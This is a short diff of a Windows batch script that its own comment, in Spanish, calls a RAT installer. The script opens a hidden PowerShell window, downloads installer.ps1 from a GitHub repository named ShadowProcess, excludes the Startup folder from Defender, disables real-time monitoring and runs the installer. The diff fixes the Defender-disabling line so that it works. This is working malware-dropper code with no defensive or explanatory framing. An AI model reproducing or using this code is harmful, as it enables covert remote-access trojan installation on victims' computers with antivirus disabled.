@@ -32,4 +32,5 @@ if '%errorlevel%' NEQ '0' (
 @REM Rat obteniendo installer 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1"; 
 Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"; 
-Set-MpPreference -DisableRealtimeMonitoring ./installer.ps1
+Set-MpPreference -DisableRealtimeMonitoring true;
+./installer.ps1
